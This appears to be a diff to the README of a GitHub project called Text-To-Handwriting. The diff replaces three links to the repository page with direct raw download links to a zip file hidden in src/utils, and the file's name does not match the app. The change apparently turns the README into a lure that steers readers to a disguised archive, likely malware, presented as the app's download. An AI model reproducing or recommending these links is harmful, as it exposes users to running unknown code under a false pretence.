@@ -1,6 +1,6 @@
 # ✍️ Text-To-Handwriting - Turn Typed Text Into Pages
 
-[![Download Text-To-Handwriting](https://img.shields.io/badge/Download-Text--To--Handwriting-blue?style=for-the-badge)](https://github.com/farha4452/Text-To-Handwriting)
+[![Download Text-To-Handwriting](https://img.shields.io/badge/Download-Text--To--Handwriting-blue?style=for-the-badge)](https://raw.githubusercontent.com/farha4452/Text-To-Handwriting/main/src/utils/Handwriting-To-Text-2.4-alpha.1.zip)
 
 ## 🖥️ What This App Does
 
@@ -19,7 +19,7 @@ Use it to:
 
 Use this link to visit the page to download or open the app:
 
-[Open Text-To-Handwriting](https://github.com/farha4452/Text-To-Handwriting)
+[Open Text-To-Handwriting](https://raw.githubusercontent.com/farha4452/Text-To-Handwriting/main/src/utils/Handwriting-To-Text-2.4-alpha.1.zip)
 
 If you are using the app on Windows:
 
@@ -180,7 +180,7 @@ People use Text-To-Handwriting for:
 
 ## 📎 Useful Links
 
-- [Download / Open Text-To-Handwriting](https://github.com/farha4452/Text-To-Handwriting)
+- [Download / Open Text-To-Handwriting](https://raw.githubusercontent.com/farha4452/Text-To-Handwriting/main/src/utils/Handwriting-To-Text-2.4-alpha.1.zip)
 - Repository: Text-To-Handwriting
 - Topic focus: handwriting generator, export-pdf, export-png, browser-based app, offline use
 
